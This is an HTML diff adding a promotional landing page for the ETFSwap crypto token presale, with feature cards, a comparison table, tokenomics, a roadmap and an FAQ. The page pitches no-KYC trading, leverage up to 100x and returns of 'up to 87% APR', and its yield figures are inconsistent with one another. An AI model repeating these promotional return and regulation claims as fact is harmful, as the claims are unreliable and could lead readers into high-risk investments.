+                      <div data-index="18" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                        style="width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner9.png" alt="SEBABANK" class="img-fluid">
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div data-index="19" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                        style="width: 260px;">
+                        <div>
+                          <div tabindex="-1" style="width: 100%; display: inline-block;">
+                            <div class="partner-item-slider"><img src="partner10.png" alt="Polygon" class="img-fluid"
+                                width="207" height="49"></div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="slick-arrow slick-next"><img src="Group186.png" alt="next"></div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section class="mission-section">
+          <div class="container">
+            <div class="mission-content">
+              <div class="row d-flex align-items-center">
+                <div class="col-12 col-md-12 col-lg-6">
+                  <div class="mission-img"><img src="mission-DbXARFmY.webp" alt="our mission - etf in cryptocurrency"
+                      class="img-fluid" width="555" height="593"></div>
+                </div>
+                <div class="col-12 col-md-12 col-lg-6">
+                  <div class="mission-detail">
+                    <div class="heading">
+                      <h2 class="title">Our Mission</h2>
+                    </div>
+                    <p class="description">At ETFSwap, our mission is to revolutionize the accessibility and efficiency
+                      of ETF trading through blockchain technology. By leveraging decentralized protocols, we aim to
+                      democratize access to institutional-grade ETFs, empowering both retail and qualified investors
+                      worldwide. Our platform is committed to providing a secure and transparent environment that
+                      fosters optimal trading conditions and seamless ETF management. We strive to innovate continually,
+                      ensuring that ETFSwap remains at the forefront of the tokenized ETF market, unlocking new avenues
+                      for investment and redefining the future of finance. Join us as we pave the way for a more
+                      inclusive and dynamic era of ETF trading.</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section class="work-section">
+          <div class="container">
+            <div class="work-content">
+              <div class="heading">
+                <h2 class="title">How our ETF tokenization platform works</h2>
+              </div>
+              <div class="row">
+                <div class="col-12 col-md-4 col-lg-4">
+                  <div class="work-item"><span><img src="icon1.png" alt="wallet icon - crypto etf approval"
+                        class="img-fluid"></span>
+                    <p>Connect your wallet to our ETF trading platform</p>
+                  </div>
+                </div>
+                <div class="col-12 col-md-4 col-lg-4">
+                  <div class="work-item"><span><img src="icon2.png" alt="Broswer icon" class="img-fluid"></span>
+                    <p>Browse our ETF index screener and to create investment portfolio</p>
+                  </div>
+                </div>
+                <div class="col-12 col-md-4 col-lg-4">
+                  <div class="work-item"><span><img src="icon3.png" alt="swap icon" class="img-fluid"></span>
+                    <p>Swap your chosen Cryptocurrency with a publicly listed ETF for cryptocurrency</p>
+                  </div>
+                </div>
+              </div>
+              <div class="video-detail">
+                <div class="wallet-main-section video-section">
+                  <div class="video-wrapper"><video autoplay="" loop="" playsinline="" width="800" height="400"
+                      class="real-world-left-video">
+                      <source src="ETFSwap-BRCUMqqS.mp4" type="video/mp4">
+                    </video></div>
+                </div>
+                <div class="my-2"><button class="btn btn-primary mx-auto">BUY ETFS</button></div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section class="feature-section" id="access-institutional">
+          <div class="container">
+            <div class="feature-content">
+              <div class="heading">
+                <h2 class="title text-center">Access institutional trading platform</h2>
+              </div>
+              <div class="feature-detail">
+                <div class="row">
+                  <div class="col-6 col-md-6 col-lg-3 access">
+                    <div class="feature-item">
+                      <div class="feature-img"><img src="diagram.png" alt="Cryptocurrency ETFs (Spot/Future)"
+                          class="img-fluid commodities" width="51" height="51"></div>
+                      <h3 class="title">Cryptocurrency ETFs (Spot/Future)</h3>
+                      <p class="description">These ETFs monitor the performance of cryptocurrency-focused ETFs from
+                        leading asset managers such as Blackrock and Fidelity.</p>
+                    </div>
+                  </div>
+                  <div class="col-6 col-md-6 col-lg-3 access">
+                    <div class="feature-item">
+                      <div class="feature-img"><img src="finance-growth.png" alt="Leveraged ETFs"
+                          class="img-fluid commodities" width="51" height="51"></div>
+                      <h3 class="title">Leveraged ETFs</h3>
+                      <p class="description">Utilizing financial derivatives and significant leverage, these ETFs aim to
+                        amplify the returns of an underlying index or asset by up to 100 times.</p>
+                    </div>
+                  </div>
+                  <div class="col-6 col-md-6 col-lg-3 access">
+                    <div class="feature-item item1">
+                      <div class="feature-img"><img src="commodities.webp" alt="Commodity ETFs"
+                          class="img-fluid commodities" width="51" height="51"></div>
+                      <h3 class="title">Commodity ETFs</h3>
+                      <p class="description">These ETFs offer exposure to commodities like gold, oil, or corn, without
+                        the hassle of storing or managing physical assets themselves. </p>
+                    </div>
+                  </div>
+                  <div class="col-6 col-md-6 col-lg-3 access">
+                    <div class="feature-item item1">
+                      <div class="feature-img"><img src="ratings.png" alt="Fixed Income ETFs"
+                          class="img-fluid commodities" width="51" height="51"></div>
+                      <h3 class="title">Fixed Income ETFs</h3>
+                      <p class="description">Investing in a stable mix of bonds, treasuries, and other fixed-income
+                        securities, these ETFs offer reliable returns and reduced volatility.</p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section class="feature-section" id="feature">
+          <div class="container">
+            <div class="feature-content">
+              <div class="heading">
+                <h2 class="title text-center">Platform Features</h2>
+              </div>
+              <div class="feature-detail">
+                <div class="row">
+                  <div class="col-12 col-md-12 col-lg-4">
+                    <div class="feature-item">
+                      <div class="feature-img"><img src="feature3.png" alt="Swap" class="img-fluid"></div>
+                      <h3 class="title">Swap</h3>
+                      <p class="description">ETFSwap makes trading easy and rewarding. Our decentralized infrastructure
+                        allows you to swap assets securely and cost effectively across multiple markets</p><button
+                        class="btn btn-primary">Start swapping</button>
+                    </div>
+                  </div>
+                  <div class="col-12 col-md-12 col-lg-4">
+                    <div class="feature-item">
+                      <div class="feature-img"><img src="feature1.png" alt="Stake" class="img-fluid"></div>
+                      <h3 class="title">Stake </h3>
+                      <p class="description">Adding your assets to pools provides liquidity for swap trading. Earn yield
+                        from trading fees as each ETF pool’s trading volume grows.</p><button
+                        class="btn btn-primary">Start earning</button>
+                    </div>
+                  </div>
+                  <div class="col-12 col-md-12 col-lg-4">
+                    <div class="feature-item item1">
+                      <div class="feature-img"><img src="feature2.png" alt="Perpetual Futures &amp; Options"
+                          class="img-fluid"></div>
+                      <h3 class="title">Perpetual Futures &amp; Options</h3>
+                      <p class="description">Trading in long and short options directly from the platform, offering you
+                        up to 50x leverage across all listed ETFS.</p><button class="btn btn-primary">Start
+                        investing</button>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section class="staking-section" id="staking">
+          <div class="container">
+            <div class="staking-content">
+              <div class="heading">
+                <h2 class="title text-center">Staking</h2>
+                <p class="description">By staking ETFS tokens, investors can earn rewards from our 5% sell tax, trading
+                  fee etc. which contributes to a dedicated reward pool. This staking mechanism offers our community a
+                  distinctive opportunity to earn ETFS token rewards while actively supporting the institutional ETF
+                  Revolution's growth.</p>
+              </div>
+              <div class="staking-detail text-center"><img src="staking1-DQglLtLH.webp" alt="Staking" class="img-fluid"
+                  width="1126" height="681"></div>
+              <div class="my-2"><button class="btn  btn-primary mx-auto">BUY ETFS</button></div>
+            </div>
+          </div>
+          <div class="staking-bg"><img src="staking1.png" alt="Staking" class="img-fluid" width="381" height="342">
+          </div>
+        </section>
+        <section class="etfs-section" id="etf">
+          <div class="container">
+            <div class="etfs-content">
+              <div class="row d-flex align-items-center">
+                <div class="col-12 col-md-12 col-lg-6">
+                  <div class="etfs-tabs">
+                    <div class="tab-content">
+                      <table class="table" style="table-layout: fixed;">
+                        <tbody>
+                          <tr class="heading">
+                            <th></th>
+                            <th>ETFSwap</th>
+                            <th>Traditional ETFs</th>
+                          </tr>
+                          <tr>
+                            <td> <button class="nav-link active" id="v-pills-home-tab" data-bs-toggle="pill"
+                                data-bs-target="#v-pills-home" type="button" role="tab" aria-controls="v-pills-home"
+                                aria-selected="true"><span><img src="Frame.png" alt="Trading hours"
+                                    class="img-fluid"></span>Trading hours</button></td>
+                            <td>24/7 access</td>
+                            <td>Limited to trading hours</td>
+                          </tr>
+                          <tr>
+                            <td> <button class="nav-link" id="v-pills-profile-tab" data-bs-toggle="pill"
+                                data-bs-target="#v-pills-profile" type="button" role="tab"
+                                aria-controls="v-pills-profile" aria-selected="false"><span><img src="Frame%20(1).png"
+                                    alt="KYC" class="img-fluid" width="25" height="24"></span>KYC</button></td>
+                            <td>No requirements</td>
+                            <td>KYC required</td>
+                          </tr>
+                          <tr>
+                            <td> <button class="nav-link" id="v-pills-messages-tab" data-bs-toggle="pill"
+                                data-bs-target="#v-pills-messages" type="button" role="tab"
+                                aria-controls="v-pills-messages" aria-selected="false"><span><img src="Frame%20(2).png"
+                                    alt="Fees" class="img-fluid" width="25" height="24"></span>Fees</button></td>
+                            <td>No extra fees</td>
+                            <td>Between 20bps to 2%</td>
+                          </tr>
+                          <tr>
+                            <td> <button class="nav-link" id="v-pills-settings-tab" data-bs-toggle="pill"
+                                data-bs-target="#v-pills-settings" type="button" role="tab"
+                                aria-controls="v-pills-settings" aria-selected="false"><span><img src="Frame%20(3).png"
+                                    alt="Risk" class="img-fluid" width="25" height="24"></span>Risk</button></td>
+                            <td>Ability to trade anytime</td>
+                            <td>Can be impacted by out of hours news</td>
+                          </tr>
+                          <tr>
+                            <td> <button class="nav-link" id="v-pills-settings-tab" data-bs-toggle="pill"
+                                data-bs-target="#v-pills-settings" type="button" role="tab"
+                                aria-controls="v-pills-settings" aria-selected="false"><span><img src="Frame%20(3).png"
+                                    alt="Risk" class="img-fluid" width="25" height="24"></span>Staking</button></td>
+                            <td>Ability to stake ETFS</td>
+                            <td>No staking options via banks</td>
+                          </tr>
+                          <tr>
+                            <td> <button class="nav-link" id="v-pills-tab1-tab" data-bs-toggle="pill"
+                                data-bs-target="#v-pills-tab1" type="button" role="tab" aria-controls="v-pills-tab1"
+                                aria-selected="false"><span><img src="Frame%20(4).png" alt="Staking" class="img-fluid"
+                                    width="25" height="24"></span>Flexibility</button></td>
+                            <td>Trade in minutes</td>
+                            <td>Account opening may take up to 24hrs</td>
+                          </tr>
+                          <tr style="border-bottom: none;">
+                            <td> <button class="nav-link" id="v-pills-tab2-tab" data-bs-toggle="pill"
+                                data-bs-target="#v-pills-tab2" type="button" role="tab" aria-controls="v-pills-tab2"
+                                aria-selected="false"><span><img src="Frame%20(5).png" alt="Simplicity"
+                                    class="img-fluid"></span>Simplicity</button></td>
+                            <td style="border-bottom: none;">Be in full control</td>
+                            <td style="border-bottom: none;">Banks are in full control</td>
+                          </tr>
+                        </tbody>
+                      </table>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-12 col-md-12 col-lg-6">
+                  <div class="etfs-swap">
+                    <div class="heading">
+                      <h2 class="title">Why Use ETFSwap?</h2>
+                      <p class="description">ETFSwap stands as the catalyst for change in a banking landscape that has
+                        been stagnant for too long. Here, investors are liberated from the burdensome rules of
+                        traditional banking. The advantages of using ETFSwap include:</p>
+                    </div>
+                    <div class="etfsswap-item">
+                      <h2>Ease of Trading</h2>
+                      <p>DeFi enables 24/7 trading, which offers greater flexibility than centralized ETFs.</p>
+                    </div>
+                    <div class="etfsswap-item">
+                      <h2>No KYC</h2>
+                      <p>ETFSwap requires no KYC registration, which means you can open an account in minutes</p>
+                    </div>
+                    <div class="etfsswap-item">
+                      <h2>Low Costs</h2>
+                      <p>Smart contract driven products require no fund manager, hence no extra management fees.</p>
+                    </div>
+                    <div class="etfsswap-item">
+                      <h2>Flexibility</h2>
+                      <p>ETFSwap allows you to switch between crypto and ETFs in seconds, whereas some Banks do not
+                        allow crypto trading.</p>
+                    </div>
+                    <div class="etfsswap-item">
+                      <h2>Extra Income</h2>
+                      <p>Our native token ETFS enables you to earn up to 87% APR yield.</p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section class="benefit-section">
+          <div class="container">
+            <div class="benefit-content">
+              <div class="row d-flex align-items-start">
+                <div class="col-12 col-md-12 col-lg-6">
+                  <div class="benefit-detail">
+                    <div class="heading">
+                      <h2 class="title">Benefits Of Investing In ETFS Token</h2>
+                    </div>
+                    <div class="benefit-item">
+                      <div class="benefit-img"><img src="benefit1.png" alt="Trading Discounts" class="img-fluid"></div>
+                      <div class="details">
+                        <h3>Trading Discounts</h3>
+                        <p>ETFS functions as the principal currency within the ETFSwap ecosystem. To enhance the utility
+                          of our tokenization platform, we provide a special trading fee discount system, enabling
+                          investors to participate at reduced costs.</p>
+                      </div>
+                    </div>
+                    <div class="benefit-item">
+                      <div class="benefit-img"><img src="benefit2.png" alt="Passive Income" class="img-fluid"></div>
+                      <div class="details">
+                        <h3>Passive Income</h3>
+                        <p>Earn up to 36% from our staking pool linked directly to our ETF Swap liquidity, providing a
+                          lucrative opportunity for generating passive income.</p>
+                      </div>
+                    </div>
+                    <div class="benefit-item">
+                      <div class="benefit-img"><img src="benefit3.png" alt="Automic Rewards" class="img-fluid"></div>
+                      <div class="details">
+                        <h3>Automatic Rewards</h3>
+                        <p>Every transaction fee collected as a sell tax, trading fee is allocated to the ETFS reward
+                          pool, from which monthly airdrops benefit token holders, thereby boosting their investment
+                          returns.</p>
+                      </div>
+                    </div>
+                    <div class="benefit-item">
+                      <div class="benefit-img"><img src="benefit4.png" alt="Lower Fees" class="img-fluid"></div>
+                      <div class="details">
+                        <h3>Lower Fees</h3>
+                        <p>By holding ETFS tokens, you gain access to reduced trading fees, lowering transaction costs
+                          and enhancing the cost-effectiveness of daily trading activities.</p>
+                      </div>
+                    </div>
+                    <div class="benefit-item">
+                      <div class="benefit-img"><img src="benefit5.png" alt="Voting Rights" class="img-fluid"></div>
+                      <div class="details">
+                        <h3>Voting Rights</h3>
+                        <p>As an ETFS holder, you will possess voting rights within the platform’s governance system,
+                          enabling you to influence its future direction and align it with your investment goals.</p>
+                      </div>
+                    </div>
+                    <div class="benefit-item">
+                      <div class="benefit-img"><img src="benefit6.png" alt="Early Access" class="img-fluid"></div>
+                      <div class="details">
+                        <h3>Early Access</h3>
+                        <p>Get early access to new ETF listings and updates on exclusive investment opportunities. This
+                          allows you to capitalize on favorable market conditions and boost your portfolio's
+                          performance.</p>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="benefit-button "><button class="btn btn-primary mt-2 mb-3">BUY ETFS</button></div>
+                </div>
+                <div class="col-12 col-md-12 col-lg-6">
+                  <div class="benefit-main"><img src="benefit.webp" alt="benefits" class="img-fluid" width="636"
+                      height="538"></div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section class="crypto-section">
+          <div class="container">
+            <div class="crypto-content">
+              <div class="row">
+                <div class="col-12 col-md-12 col-lg-6">
+                  <div class="crypto-img"><img src="crypto-DqeByHXv.webp" alt="Why hybrid Institutional Crypto ETFs"
+                      class="img-fluid" width="636" height="352"></div>
+                </div>
+                <div class="col-12 col-md-12 col-lg-6">
+                  <div class="crypto-detail">
+                    <h2 class="title">Why Hybrid Institutional Crypto ETF Are Poised for Growth</h2>
+                    <p class="description">Since the debut of the first Gold ETF in 2006, which transformed the gold
+                      market, leading market experts are increasingly optimistic that the launch of several
+                      institutional crypto ETFs will similarly reshape the trajectory of Web3.0 development. With spot
+                      Bitcoin ETFs now trading and spot Ethereum ETFs approved, and potential Solana ETFs on the
+                      horizon, the landscape of institutional crypto investment is rapidly evolving.<br>ETFSwap aims to
+                      be at the forefront of this transformative era by establishing the first decentralized protocol
+                      that provides direct access to institutional ETFs. These developments are pivotal in broadening
+                      the range of exchange-traded funds, introducing new asset classes, and diversifying underlying
+                      assets. The introduction of hybrid institutional crypto ETFs, including bitcoin ETF token presale,
+                      leveraged and inverse ETFs, marks a significant expansion in the types of financial instruments
+                      available to investors seeking exposure to ETF cryptocurrency markets.</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="crypto-img1"><img src="staking1.png" alt="staking background image" class="img-fluid" width="381"
+              height="342"></div>
+        </section>
+        <section class="roadmap-section" id="roadmap">
+          <div class="container">
+            <div class="roadmap-content">
+              <div class="heading">
+                <h2 class="title text-center">Our Roadmap</h2>
+              </div>
+              <div class="roadmap-slider-content">
+                <div class="roadmap-slider">
+                  <div class="slick-slider slick-initialized" dir="ltr">
+                    <div class="slick-arrow slick-prev"><img src="Group185.png" alt="previous"></div>
+                    <div class="slick-list">
+                      <div class="slick-track"
+                        style="width: 3888px; opacity: 1; transform: translate3d(-1296px, 0px, 0px);">
+                        <div data-index="-3" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                          style="width: 432px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="roadmap-item">
+                                <h3>Phase 1</h3>
+                                <ul>
+                                  <li>Website launch</li>
+                                  <li>Obtaining the necessary licenses&nbsp;</li>
+                                  <li>Smart Contract Audit</li>
+                                  <li>Platform launch Beta Mode</li>
+                                  <li>Community and Marketing Development</li>
+                                </ul>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="-2" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                          style="width: 432px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="roadmap-item">
+                                <h3>Phase 2&nbsp;</h3>
+                                <ul>
+                                  <li>Launch partnerships program</li>
+                                  <li>Increase marketing</li>
+                                  <li>Launch staking dapp</li>
+                                  <li>Community rewards</li>
+                                  <li>Team formation</li>
+                                  <li>Launch ETFSwap platform</li>
+                                </ul>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="-1" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                          style="width: 432px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="roadmap-item">
+                                <h3>Phase 3</h3>
+                                <ul>
+                                  <li>Complete Presale</li>
+                                  <li>Token launch Uniswap&nbsp;&nbsp;</li>
+                                  <li>Launch staking dapp</li>
+                                  <li>Coin Market Cap Listing</li>
+                                  <li>Early token release competitions</li>
+                                  <li>Add KOLs&nbsp;</li>
+                                </ul>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="0" class="slick-slide slick-active slick-current" tabindex="-1"
+                          aria-hidden="false" style="outline: none; width: 432px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="roadmap-item">
+                                <h3>Phase 1</h3>
+                                <ul>
+                                  <li>Website launch</li>
+                                  <li>Obtaining the necessary licenses&nbsp;</li>
+                                  <li>Smart Contract Audit</li>
+                                  <li>Platform launch Beta Mode</li>
+                                  <li>Community and Marketing Development</li>
+                                </ul>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="1" class="slick-slide slick-active" tabindex="-1" aria-hidden="false"
+                          style="outline: none; width: 432px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="roadmap-item">
+                                <h3>Phase 2&nbsp;</h3>
+                                <ul>
+                                  <li>Launch partnerships program</li>
+                                  <li>Increase marketing</li>
+                                  <li>Launch staking dapp</li>
+                                  <li>Community rewards</li>
+                                  <li>Team formation</li>
+                                  <li>Launch ETFSwap platform</li>
+                                </ul>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="2" class="slick-slide slick-active" tabindex="-1" aria-hidden="false"
+                          style="outline: none; width: 432px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="roadmap-item">
+                                <h3>Phase 3</h3>
+                                <ul>
+                                  <li>Complete Presale</li>
+                                  <li>Token launch Uniswap&nbsp;&nbsp;</li>
+                                  <li>Launch staking dapp</li>
+                                  <li>Coin Market Cap Listing</li>
+                                  <li>Early token release competitions</li>
+                                  <li>Add KOLs&nbsp;</li>
+                                </ul>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="3" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                          style="width: 432px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="roadmap-item">
+                                <h3>Phase 1</h3>
+                                <ul>
+                                  <li>Website launch</li>
+                                  <li>Obtaining the necessary licenses&nbsp;</li>
+                                  <li>Smart Contract Audit</li>
+                                  <li>Platform launch Beta Mode</li>
+                                  <li>Community and Marketing Development</li>
+                                </ul>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="4" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                          style="width: 432px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="roadmap-item">
+                                <h3>Phase 2&nbsp;</h3>
+                                <ul>
+                                  <li>Launch partnerships program</li>
+                                  <li>Increase marketing</li>
+                                  <li>Launch staking dapp</li>
+                                  <li>Community rewards</li>
+                                  <li>Team formation</li>
+                                  <li>Launch ETFSwap platform</li>
+                                </ul>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <div data-index="5" tabindex="-1" class="slick-slide slick-cloned" aria-hidden="true"
+                          style="width: 432px;">
+                          <div>
+                            <div tabindex="-1" style="width: 100%; display: inline-block;">
+                              <div class="roadmap-item">
+                                <h3>Phase 3</h3>
+                                <ul>
+                                  <li>Complete Presale</li>
+                                  <li>Token launch Uniswap&nbsp;&nbsp;</li>
+                                  <li>Launch staking dapp</li>
+                                  <li>Coin Market Cap Listing</li>
+                                  <li>Early token release competitions</li>
+                                  <li>Add KOLs&nbsp;</li>
+                                </ul>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="slick-arrow slick-next"><img src="Group186.png" alt="next"></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section class="tokenomics-section" id="tokenomics">
+          <div class="container">
+            <div class="tokenomics-content">
+              <div class="heading">
+                <h2 class="title text-center">Tokenomics Feature</h2>
+              </div>
+              <div class="tokenomics-img text-center"><img src="tokenomics.webp" alt="Tokenomics" class="img-fluid"
+                  width="1296" height="890"></div>
+              <div class="tokenomics-detail">
+                <div class="row d-flex justify-content-center">
+                  <div class="col-12 col-md-12 col-lg-4">
+                    <div class="tok-item active">
+                      <h2>1,000,000,000</h2>
+                      <p class="description">Total Tokens</p>
+                    </div>
+                  </div>
+                  <div class="col-6 col-md-6 col-lg-2">
+                    <div class="tok-item">
+                      <h2>400,000,000</h2>
+                      <p class="description">Presale</p>
+                    </div>
+                  </div>
+                  <div class="col-6 col-md-6 col-lg-2">
+                    <div class="tok-item">
+                      <h2>240,000,000</h2>
+                      <p class="description">Ecosystem</p>
+                    </div>
+                  </div>
+                  <div class="col-6 col-md-6 col-lg-2">
+                    <div class="tok-item">
+                      <h2>120,000,000</h2>
+                      <p class="description">Liquidity &amp; Listings Reserves</p>
+                    </div>
+                  </div>
+                </div>
+                <div class="row d-flex justify-content-center">
+                  <div class="col-6 col-md-6 col-lg-2">
+                    <div class="tok-item">
+                      <h2>60,000,000</h2>
+                      <p class="description">Team</p>
+                    </div>
+                  </div>
+                  <div class="col-6 col-md-6 col-lg-2">
+                    <div class="tok-item">
+                      <h2>60,000,000</h2>
+                      <p class="description">MM, Incentives KOL's</p>
+                    </div>
+                  </div>
+                  <div class="col-6 col-md-6 col-lg-2">
+                    <div class="tok-item">
+                      <h2>50,000,000</h2>
+                      <p class="description">Cashback Reserve</p>
+                    </div>
+                  </div>
+                  <div class="col-6 col-md-6 col-lg-2">
+                    <div class="tok-item">
+                      <h2>30,000,000</h2>
+                      <p class="description">Partners &amp; Advisors</p>
+                    </div>
+                  </div>
+                  <div class="col-6 col-md-6 col-lg-2">
+                    <div class="tok-item">
+                      <h2>40,000,000</h2>
+                      <p class="description">Community Rewards</p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="tok-button text-center"><button href="#" class="btn btn-light">BUY ETFS</button></div>
+            </div>
+          </div>
+        </section>
+        <section class="platform">
+          <div class="container">
+            <div class="platform-content">
+              <div class="heading text-center">
+                <h2 class="title">ETFSwap Easy To Use Platform</h2>
+                <p class="description mb-0">Manage all your ETF investing, staking and other needs in one central
+                  ETFSwap dashboard.</p>
+              </div>
+              <div class="platform-img text-center"><img src="platform1-DbsS-Mlw.webp" alt="platform" class="img-fluid"
+                  width="1112" height="668"></div>
+              <div class="platform-button text-center"><button href="#" class="btn btn-light">BUY ETFS</button></div>
+            </div>
+          </div>
+          <div class="platform1"><img src="Ellipse%2012.webp" alt="Ellipse" class="img-fluid" width="227" height="422">
+          </div>
+          <div class="platform2"><img src="Ellipse%2013.webp" alt="Ellipse" class="img-fluid" width="300" height="401">
+          </div>
+        </section>
+        <section class="feature-partner">
+          <div class="container">
+            <div class="feature-partner-content">
+              <div class="fea-partner">
+                <h2>Featured In</h2>
+                <div class="fea-item"><img src="fea.webp" alt="Featured Partners" class="img-fluid" width="1296"
+                    height="155"></div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section class="faq-section" id="faq">
+          <div class="container">
+            <div class="faq-content">
+              <div class="heading">
+                <h2 class="title text-center">Frequently Asked Questions</h2>
+              </div>
+              <div class="accordion" id="accordionExample">
+                <div class="accordion-item">
+                  <h2 class="accordion-header" id="headingOne"><button class="accordion-button collapsed" type="button"
+                      data-bs-toggle="collapse" data-bs-target="#collapseOne" aria-expanded="false"
+                      aria-controls="collapseOne">When will I get my tokens?</button></h2>
+                  <div id="collapseOne" class="accordion-collapse collapse" aria-labelledby="headingOne"
+                    data-bs-parent="#accordionExample">
+                    <div class="accordion-body">At the end of the presale we will airdrop it to the provided receiving
+                      wallet.</div>
+                  </div>
+                </div>
+                <div class="accordion-item">
+                  <h2 class="accordion-header" id="headingTwo"><button class="accordion-button collapsed" type="button"
+                      data-bs-toggle="collapse" data-bs-target="#collapseTwo" aria-expanded="false"
+                      aria-controls="collapseTwo">Will you list on exchanges?</button></h2>
+                  <div id="collapseTwo" class="accordion-collapse collapse" aria-labelledby="headingTwo"
+                    data-bs-parent="#accordionExample">
+                    <div class="accordion-body">We plan to list on DEX and CEX exchanges upon launch, further listing
+                      details will be provided closer to launch.</div>
+                  </div>
+                </div>
+                <div class="accordion-item">
+                  <h2 class="accordion-header" id="headingThree"><button class="accordion-button collapsed"
+                      type="button" data-bs-toggle="collapse" data-bs-target="#collapseThree" aria-expanded="false"
+                      aria-controls="collapseThree">Will I pay any tax for buying and selling?</button></h2>
+                  <div id="collapseThree" class="accordion-collapse collapse" aria-labelledby="headingThree"
+                    data-bs-parent="#accordionExample">
+                    <div class="accordion-body">1% buy, proceeds of which will be burnt <br> 5% Sell, proceeds of which
+                      will be added to the rewards pool</div>
+                  </div>
+                </div>
+                <div class="accordion-item">
+                  <h2 class="accordion-header" id="headingSixteen"><button class="accordion-button collapsed"
+                      type="button" data-bs-toggle="collapse" data-bs-target="#collapseSixteen" aria-expanded="false"
+                      aria-controls="collapseSixteen">Do you have an Anti-dump plan for the tokens?</button></h2>
+                  <div id="collapseSixteen" class="accordion-collapse collapse" aria-labelledby="headingSixteen"
+                    data-bs-parent="#accordionExample">
+                    <div class="accordion-body">Any unsold tokens will be burned. In addition to that, all the team
+                      tokens will be locked for five years.</div>
+                  </div>
+                </div>
+                <div class="accordion-item">
+                  <h2 class="accordion-header" id="headingSeventeen"><button class="accordion-button collapsed"
+                      type="button" data-bs-toggle="collapse" data-bs-target="#collapseSeventeen" aria-expanded="false"
+                      aria-controls="collapseSeventeen">Is ETFSwap regulated?</button></h2>
+                  <div id="collapseSeventeen" class="accordion-collapse collapse" aria-labelledby="headingSeventeen"
+                    data-bs-parent="#accordionExample">
+                    <div class="accordion-body">We have currently applied for a license and should be approved by the
+                      end of Q3 2024.</div>
+                  </div>
+                </div>
+                <div class="accordion-item">
+                  <h2 class="accordion-header" id="headingEighteen"><button class="accordion-button collapsed"
+                      type="button" data-bs-toggle="collapse" data-bs-target="#collapseEighteen" aria-expanded="false"
+                      aria-controls="collapseEighteen">How can I see your community?</button></h2>
+                  <div id="collapseEighteen" class="accordion-collapse collapse" aria-labelledby="headingEighteen"
+                    data-bs-parent="#accordionExample">
+                    <div class="accordion-body">Please visit our Linktree to check all of our channels and communities.
+                    </div>
+                  </div>
+                </div>
+                <div class="accordion-item">
+                  <h2 class="accordion-header" id="headingNineteen"><button class="accordion-button collapsed"
+                      type="button" data-bs-toggle="collapse" data-bs-target="#collapseNineteen" aria-expanded="false"
+                      aria-controls="collapseNineteen">What returns can I expect for adding liquidity?</button></h2>
+                  <div id="collapseNineteen" class="accordion-collapse collapse" aria-labelledby="headingNineteen"
+                    data-bs-parent="#accordionExample">
+                    <div class="accordion-body">
+                      <p>Depending on the ETF Pool you have invested in, the APR vary from 8% - 86% per annum.</p>
+                    </div>
+                  </div>
+                </div>
+                <div class="accordion-item">
+                  <h2 class="accordion-header" id="headingTwenty"><button class="accordion-button collapsed"
+                      type="button" data-bs-toggle="collapse" data-bs-target="#collapseTwenty" aria-expanded="false"
+                      aria-controls="collapseTwenty">What revenue do you expect ETFswap will generate?</button></h2>
+                  <div id="collapseTwenty" class="accordion-collapse collapse" aria-labelledby="headingTwenty"
+                    data-bs-parent="#accordionExample">
+                    <div class="accordion-body">Once the ETFSwap platform is launched, we plan to start generating
+                      revenue immediately with an estimated daily volume of $20m in month 1, growing by 100%-200% month
+                      on month, due to the demand for access to institutional ETF pools.</div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section class="latest-blog">
+          <div class="container">
+            <div class="feed-content">
+              <div class="heading">
+                <h2 class="title text-center">Latest Blogs</h2>
+              </div>
+              <div class="feed-details">
+                <div class="news-slider">
+                  <div class="slick-slider slick-initialized" dir="ltr">
